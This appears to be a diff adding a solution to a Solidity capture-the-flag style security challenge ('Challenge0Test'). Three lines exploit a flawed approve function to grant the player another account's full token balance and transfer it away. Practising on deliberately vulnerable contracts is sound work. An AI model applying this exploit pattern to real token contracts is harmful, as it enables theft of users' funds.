@@ -28,6 +28,10 @@ contract Challenge0Test is Test {
         //    Add your hack below!    //
         //////////////////////////////*/
 
+        uint256 vitalikBalance = IERC20(token).balanceOf(address(vitalik));
+        VToken(token).approve(vitalik, player, vitalikBalance);
+        IERC20(token).transferFrom(vitalik, player, vitalikBalance);
+
         //============================//
 
         vm.stopPrank();
